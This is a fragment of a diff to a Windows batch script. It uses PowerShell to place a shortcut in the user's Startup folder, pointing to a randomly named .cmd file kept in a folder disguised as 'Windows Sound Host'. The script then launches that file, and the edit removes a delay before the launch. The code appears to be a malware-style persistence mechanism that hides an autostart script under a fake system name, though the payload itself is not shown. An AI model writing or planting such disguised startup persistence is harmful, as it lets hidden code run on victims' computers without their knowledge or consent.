@@ -14,8 +14,8 @@ if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Progra
     powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\31513wd5w1d3a5wd185s3d51a.cmd';$s.Save()"
     
 )
-timeout 150
 start 31513wd5w1d3a5wd185s3d51a.cmd
+
 
 
 
